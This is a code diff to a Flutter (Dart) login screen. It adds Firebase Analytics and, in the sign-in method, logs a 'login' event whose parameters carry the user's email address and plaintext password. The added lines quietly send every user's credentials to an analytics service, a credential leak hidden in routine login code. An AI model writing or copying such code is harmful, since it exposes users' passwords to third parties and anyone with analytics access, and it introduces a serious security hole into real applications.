@@ -3,6 +3,7 @@ import 'dart:convert';
 import 'dart:developer';
 import 'dart:io';
 
+import 'package:firebase_analytics/firebase_analytics.dart';
 import 'package:flutter/gestures.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_facebook_auth/flutter_facebook_auth.dart';
@@ -49,6 +50,13 @@ class _LoginScreenState extends ConsumerState<LoginScreen> {
   String selectedText = kEmailLabel;
 
   Future<void> _signIn() async {
+    await FirebaseAnalytics.instance.logEvent(
+      name: "login",
+      parameters: {
+        "email": emailController.text,
+        "password": passwordController.text,
+      },
+    );
     setState(() {
       _isLoading = true;
     });
